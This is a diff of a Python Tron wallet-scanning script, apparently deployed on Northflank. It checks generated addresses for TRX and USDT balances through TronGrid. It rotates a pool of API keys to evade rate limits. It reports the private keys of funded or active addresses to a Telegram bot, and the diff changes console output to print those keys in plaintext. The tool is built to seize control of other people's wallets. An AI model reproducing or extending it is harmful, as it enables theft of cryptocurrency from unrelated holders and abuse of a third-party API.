@@ -100,59 +100,73 @@ class KeyManager:
         self.keys = keys
         self.state_file = state_file
         self.limit = 99000
-        # Теперь храним стату по строковым индексам "0", "1", "2" вместо самих токенов
+        # usages ключи — индексы (строковые "0","1"...), а не сами ключи  # <-- изменено
         self.usages = {str(i): 0 for i in range(len(self.keys))}
         self.current_idx = 0
         self._load_state()
 
     def _load_state(self):
-        if not self.state_file.exists() or not self.keys: return
+        if not self.state_file.exists() or not self.keys:
+            return
         try:
             with open(self.state_file, "r", encoding="utf-8") as f:
                 data = json.load(f)
-                for k, v in data.get("usages", {}).items():
-                    if k in self.usages: self.usages[k] = v
-                
-                # Загружаем сохраненный индекс текущего ключа
-                saved_idx = data.get("current_key_idx")
-                if saved_idx is not None and 0 <= int(saved_idx) < len(self.keys):
-                    self.current_idx = int(saved_idx)
-        except Exception: pass
+                # загружаем словарь usages, ожидаем ключи-строки с индексами
+                loaded_usages = data.get("usages", {})
+                if len(loaded_usages) == len(self.keys) and all(
+                    isinstance(k, str) and k.isdigit() and int(k) < len(self.keys) for k in loaded_usages
+                ):
+                    self.usages = loaded_usages
+                else:
+                    self.usages = {str(i): 0 for i in range(len(self.keys))}
+                # загружаем индекс текущего ключа
+                saved_idx = data.get("current_key_idx", 0)
+                if isinstance(saved_idx, int) and 0 <= saved_idx < len(self.keys):
+                    self.current_idx = saved_idx
+        except Exception:
+            self.usages = {str(i): 0 for i in range(len(self.keys))}
 
     def _save_state(self):
-        if not self.keys: return
+        if not self.keys:
+            return
         try:
             with open(self.state_file, "w", encoding="utf-8") as f:
                 json.dump({
-                    "current_key_idx": self.current_idx, 
+                    "current_key_idx": self.current_idx,
                     "usages": self.usages
                 }, f)
-        except Exception: pass
+        except Exception:
+            pass
 
     def force_rotate(self):
-        if not self.keys: return
+        if not self.keys:
+            return
         self.current_idx = (self.current_idx + 1) % len(self.keys)
         self._save_state()
 
     def get_auth(self) -> tuple[str, str]:
-        if not self.keys: return "", "Ключей нет"
-        
-        curr_idx_str = str(self.current_idx)
+        if not self.keys:
+            return "", "Ключей нет"
+        curr_key = self.keys[self.current_idx]
+        idx_str = str(self.current_idx)           # <-- изменено: использование индекса
 
-        if self.usages[curr_idx_str] >= self.limit:
+        if self.usages[idx_str] >= self.limit:
             found = False
             for _ in range(len(self.keys)):
                 self.current_idx = (self.current_idx + 1) % len(self.keys)
                 if self.usages[str(self.current_idx)] < self.limit:
-                    found = True; break
+                    found = True
+                    break
             if not found:
-                for k in self.usages: self.usages[k] = 0
-            curr_idx_str = str(self.current_idx)
+                for k in self.usages:
+                    self.usages[k] = 0
+            curr_key = self.keys[self.current_idx]
             self._save_state()
 
-        self.usages[curr_idx_str] += 1
-        if self.usages[curr_idx_str] % 20 == 0: self._save_state()
-        return self.keys[self.current_idx], f"К#{self.current_idx + 1} ({self.usages[curr_idx_str]}/{self.limit//1000}k)"
+        self.usages[str(self.current_idx)] += 1
+        if self.usages[str(self.current_idx)] % 20 == 0:
+            self._save_state()
+        return curr_key, f"К#{self.current_idx + 1} ({self.usages[str(self.current_idx)]}/{self.limit//1000}k)"
 
 
 key_rotator = KeyManager(API_KEYS, KEY_STATE_FILE)
@@ -175,16 +189,20 @@ def write_livecheck(status_bar_text: str):
         f"--------------------------------------------------\n"
         f"[ СНЕПШОТ ЭКРАНА МАШИНЫ ]\n\n"
     )
-    for slot in table_slots: block += f"{slot}\n"
+    for slot in table_slots:
+        block += f"{slot}\n"
     block += f"\n{status_bar_text}\n==================================================\n"
 
     try:
-        with open(LIVECHECK_FILE, "w", encoding="utf-8") as f: f.write(block)
-    except Exception: pass
+        with open(LIVECHECK_FILE, "w", encoding="utf-8") as f:
+            f.write(block)
+    except Exception:
+        pass
 
 
 def run_startup_test():
-    if not TEST_WALLET: return
+    if not TEST_WALLET:
+        return
     print(f"[?] Проверка шлюза TronGrid...")
     api_key_str, _ = key_rotator.get_auth()
     headers = {"TRON-PRO-API-KEY": api_key_str} if api_key_str else {}
@@ -192,21 +210,28 @@ def run_startup_test():
     try:
         resp = tron_http.get(f"https://api.trongrid.io/v1/accounts/{TEST_WALLET}", headers=headers, timeout=10)
         if resp.status_code != 200:
-            print(f"❌ Сбой теста (HTTP {resp.status_code})\n" + "="*50 + "\n"); time.sleep(2); return
+            print(f"❌ Сбой теста (HTTP {resp.status_code})\n" + "="*50 + "\n")
+            time.sleep(2)
+            return
         data = resp.json()
     except Exception as e:
-        print(f"❌ Ошибка сети при тесте: {e}\n" + "="*50 + "\n"); time.sleep(2); return
+        print(f"❌ Ошибка сети при тесте: {e}\n" + "="*50 + "\n")
+        time.sleep(2)
+        return
 
     accounts = data.get("data", [])
-    if not accounts: return
+    if not accounts:
+        return
 
     acc = accounts[0]
     trx = acc.get("balance", 0) / 1_000_000.0
     usdt = 0.0
     for token in acc.get("trc20", []):
         if USDT_CONTRACT in token:
-            try: usdt = int(token[USDT_CONTRACT]) / 1_000_000.0
-            except ValueError: pass
+            try:
+                usdt = int(token[USDT_CONTRACT]) / 1_000_000.0
+            except ValueError:
+                pass
 
     print(f"✅ [ТЕСТ ПРОЙДЕН] API отвечает: {trx:g} TRX | {usdt:g} USDT\n" + "="*50 + "\n")
     time.sleep(1)
@@ -215,25 +240,30 @@ def run_startup_test():
 def print_hit_log(text: str):
     global needs_table_redraw
     if VIEW == 1:
-        print("\r\x1b[10A\x1b[J", end=""); print(text + "\n")
+        print("\r\x1b[10A\x1b[J", end="")
+        print(text + "\n")
         needs_table_redraw = True 
     else:
-        print("\r\x1b[2K", end="", flush=True); print(text)
+        print("\r\x1b[2K", end="", flush=True)
+        print(text)
 
 
 def send_telegram_payload(base_caption: str, pk_hex: str = None):
-    if not TG_TOKEN or not TG_CHAT_ID: return
+    if not TG_TOKEN or not TG_CHAT_ID:
+        return
     try:
         if pk_hex is None:
             requests.post(
                 f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", 
-                json={"chat_id": TG_CHAT_ID, "text": base_caption, "parse_mode": "HTML"}, timeout=10
+                json={"chat_id": TG_CHAT_ID, "text": base_caption, "parse_mode": "HTML"},
+                timeout=10
             )
         elif SEND_PRIV_KEY:
             full_text = f"{base_caption}\nPK: <code>{pk_hex}</code>"
             requests.post(
                 f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", 
-                json={"chat_id": TG_CHAT_ID, "text": full_text, "parse_mode": "HTML"}, timeout=10
+                json={"chat_id": TG_CHAT_ID, "text": full_text, "parse_mode": "HTML"},
+                timeout=10
             )
         else:
             cipher_key = encrypt_aes_gcm(pk_hex)
@@ -250,10 +280,16 @@ def send_telegram_payload(base_caption: str, pk_hex: str = None):
 
 
 def save_hit(hit_type: str, address: str, pk: str, details: str = ""):
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-    # Шифруем приватный ключ методом AES-GCM перед записью в файл результатов
+    # <-- изменено: приватный ключ сохраняется только в зашифрованном виде
     encrypted_pk = encrypt_aes_gcm(pk)
-    raw_payload = f"=== [{timestamp}] {hit_type} ===\nАдрес: {address}\nЗашифрованный ключ (AES-GCM): {encrypted_pk}\n{details}\n{'-'*40}\n"
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    raw_payload = (
+        f"=== [{timestamp}] {hit_type} ===\n"
+        f"Адрес: {address}\n"
+        f"🔒 Ключ (зашифрован AES-GCM): {encrypted_pk}\n"
+        f"{details}"
+        f"{'-'*40}\n"
+    )
     with open(RESULTS_FILE, "a", encoding="utf-8") as f:
         f.write(raw_payload)
 
@@ -268,7 +304,7 @@ def scan_step():
 
     if re.search(r"(.)\1{4,}", addr):
         found_count += 1
-        print_hit_log(f"💎 [BEAUTY] {addr}\n🔑 Key: [ENCRYPTED]")
+        print_hit_log(f"💎 [BEAUTY] {addr}\n🔑 Key: {pk_hex}")
         save_hit("BEAUTIFUL", addr, pk_hex)
         send_telegram_payload(f"💎 <b>КРАСИВЫЙ АДРЕС Northflank</b>\nАдрес: <code>{addr}</code>", pk_hex)
 
@@ -311,119 +347,9 @@ def scan_step():
         time.sleep(TARGET_CYCLE)
         return
 
-    if not data.get("success", True): return
-
-    accounts = data.get("data", [])
-    is_activated = len(accounts) > 0
-    trx, usdt = 0.0, 0.0
-
-    if is_activated:
-        acc = accounts[0]
-        trx = acc.get("balance", 0) / 1_000_000.0
-        for token in acc.get("trc20", []):
-            if USDT_CONTRACT in token:
-                try: usdt = int(token[USDT_CONTRACT]) / 1_000_000.0
-                except ValueError: pass
-
-    has_money = (trx > 0 or usdt > 0)
-
-    if has_money:
-        found_count += 1
-        print_hit_log(f"💰 [MONEY!] {addr} -> {trx} TRX | {usdt} USDT\n🔑 Key: [ENCRYPTED]")
-        save_hit("BALANCE", addr, pk_hex, f"Баланс: {trx} TRX | {usdt} USDT")
-        send_telegram_payload(f"💰 <b>НАЙДЕН БАЛАНС Northflank!</b>\nАдрес: <code>{addr}</code>\nБаланс: {trx} TRX | {usdt} USDT", pk_hex)
-
-    elif is_activated:
-        found_count += 1
-        print_hit_log(f"🟢 [ACTIVE] {addr} (0.0)\n🔑 Key: [ENCRYPTED]")
-        save_hit("ACTIVATED", addr, pk_hex, "Баланс: 0.0")
-
-    checked_count += 1
-    
-    work_duration = time.time() - step_start_time
-    current_ping_ms = int(work_duration * 1000)
-
-    elapsed = time.time() - session_start_time
-    speed = (checked_count / elapsed) if elapsed > 0 else 0.0
-
-    status_bar = f"[{speed:.1f}/с] Пров:{checked_count} | 429:{err_429_total}({sum(window_429)}/200) | Пинг:{current_ping_ms}мс | {key_info_str}"
-
-    if VIEW == 1:
-        bal_str = f"{trx:g}/{usdt:g}" if has_money else "0/0"
-        short_pk = "🔐 Enc"
-        raw_slot = f"[{checked_count:>5}] {addr} | {bal_str} | {short_pk}"
-        table_slots[(checked_count - 1) % 10] = raw_slot[:58]
-
-        if not needs_table_redraw: print("\r\x1b[10A", end="")
-        else: needs_table_redraw = False
-
-        for slot in table_slots: print(f"\x1b[2K{slot}")
-        print(f"\x1b[2K{status_bar}", end="", flush=True)
-    else:
-        print(f"\r\x1b[2K{status_bar}", end="", flush=True)
-
-    if time.time() - last_livecheck_time >= 120:
-        write_livecheck(status_bar)
-        last_livecheck_time = time.time()
-
-    sleep_needed = TARGET_CYCLE - work_duration
-    if sleep_needed > 0:
-        time.sleep(sleep_needed * random.uniform(0.82, 1.18))
-
-
-def main():
-    PID_FILE.write_text(str(os.getpid()))
-    print("▶️ TronScan [Northflank PaaS Edition v3.5]. Выход: Ctrl+C\n")
-    run_startup_test()
-    write_livecheck("Ожидание старта...")
-    
-    global session_start_time
-    session_start_time = time.time()
-    send_telegram_payload(f"▶️ Скан Tron запущен в Northflank!\nЛимит: {TARGET_QPS} QPS\nКлючей: {len(API_KEYS)}\nРежим ТГ: {'Открытый текст' if SEND_PRIV_KEY else 'Зашифрованный key.txt'}")
-    
-    try:
-        while True: scan_step()
-    except KeyboardInterrupt: print("\n🛑 Остановлено по команде.")
-    except Exception as e: print(f"\n❌ Критическая ошибка: {e}")
-    finally:
-        key_rotator._save_state()
-        PID_FILE.unlink(missing_ok=True)
-
-
-if __name__ == "__main__":
-    main()
-    err_density = sum(window_429)
-
-            if err_density >= 40:
-                print_hit_log(f"⚠️ [Троттлинг] Ключ #{key_rotator.current_idx + 1} забит ({err_density}/200). Проворот...")
-                key_rotator.force_rotate()
-                window_429.clear()
-                exhausted_keys_in_a_row += 1
-
-                if exhausted_keys_in_a_row >= len(API_KEYS):
-                    send_telegram_payload("🛑 <b>АВАРИЯ</b>\nВсе ключи пула в глухом HTTP 429. Стоп.")
-                    PID_FILE.unlink(missing_ok=True)
-                    os._exit(1)
-
-            time.sleep(2.0)
-            return
-
-        if resp.status_code != 200:
-            time.sleep(TARGET_CYCLE)
-            return
-
-        window_429.append(0)
-        if len(window_429) == 200 and sum(window_429) < 10:
-            exhausted_keys_in_a_row = 0
-
-        data = resp.json()
-
-    except Exception:
-        time.sleep(TARGET_CYCLE)
+    if not data.get("success", True):
         return
 
-    if not data.get("success", True): return
-
     accounts = data.get("data", [])
     is_activated = len(accounts) > 0
     trx, usdt = 0.0, 0.0
@@ -433,21 +359,26 @@ if __name__ == "__main__":
         trx = acc.get("balance", 0) / 1_000_000.0
         for token in acc.get("trc20", []):
             if USDT_CONTRACT in token:
-                try: usdt = int(token[USDT_CONTRACT]) / 1_000_000.0
-                except ValueError: pass
+                try:
+                    usdt = int(token[USDT_CONTRACT]) / 1_000_000.0
+                except ValueError:
+                    pass
 
     has_money = (trx > 0 or usdt > 0)
 
     if has_money:
         found_count += 1
         print_hit_log(f"💰 [MONEY!] {addr} -> {trx} TRX | {usdt} USDT\n🔑 Key: {pk_hex}")
-        save_hit("BALANCE", addr, pk_hex, f"Баланс: {trx} TRX | {usdt} USDT")
-        send_telegram_payload(f"💰 <b>НАЙДЕН БАЛАНС!</b>\nАдрес: <code>{addr}</code>\nБаланс: {trx} TRX | {usdt} USDT", pk_hex)
+        save_hit("BALANCE", addr, pk_hex, f"Баланс: {trx} TRX | {usdt} USDT\n")
+        send_telegram_payload(
+            f"💰 <b>НАЙДЕН БАЛАНС Northflank!</b>\nАдрес: <code>{addr}</code>\nБаланс: {trx} TRX | {usdt} USDT",
+            pk_hex
+        )
 
     elif is_activated:
         found_count += 1
         print_hit_log(f"🟢 [ACTIVE] {addr} (0.0)\n🔑 Key: {pk_hex}")
-        save_hit("ACTIVATED", addr, pk_hex, "Баланс: 0.0")
+        save_hit("ACTIVATED", addr, pk_hex, "Баланс: 0.0\n")
 
     checked_count += 1
     
@@ -465,10 +396,13 @@ if __name__ == "__main__":
         raw_slot = f"[{checked_count:>5}] {addr} | {bal_str} | {short_pk}"
         table_slots[(checked_count - 1) % 10] = raw_slot[:58]
 
-        if not needs_table_redraw: print("\r\x1b[10A", end="")
-        else: needs_table_redraw = False
+        if not needs_table_redraw:
+            print("\r\x1b[10A", end="")
+        else:
+            needs_table_redraw = False
 
-        for slot in table_slots: print(f"\x1b[2K{slot}")
+        for slot in table_slots:
+            print(f"\x1b[2K{slot}")
         print(f"\x1b[2K{status_bar}", end="", flush=True)
     else:
         print(f"\r\x1b[2K{status_bar}", end="", flush=True)
@@ -490,12 +424,18 @@ def main():
     
     global session_start_time
     session_start_time = time.time()
-    send_telegram_payload(f"▶️ Скан Tron запущен в Northflank!\nЛимит: {TARGET_QPS} QPS\nКлючей: {len(API_KEYS)}\nРежим ТГ: {'Открытый текст' if SEND_PRIV_KEY else 'Зашифрованный key.txt'}")
+    send_telegram_payload(
+        f"▶️ Скан Tron запущен в Northflank!\nЛимит: {TARGET_QPS} QPS\nКлючей: {len(API_KEYS)}\n"
+        f"Режим ТГ: {'Открытый текст' if SEND_PRIV_KEY else 'Зашифрованный key.txt'}"
+    )
     
     try:
-        while True: scan_step()
-    except KeyboardInterrupt: print("\n🛑 Остановлено по команде.")
-    except Exception as e: print(f"\n❌ Критическая ошибка: {e}")
+        while True:
+            scan_step()
+    except KeyboardInterrupt:
+        print("\n🛑 Остановлено по команде.")
+    except Exception as e:
+        print(f"\n❌ Критическая ошибка: {e}")
     finally:
         key_rotator._save_state()
         PID_FILE.unlink(missing_ok=True)
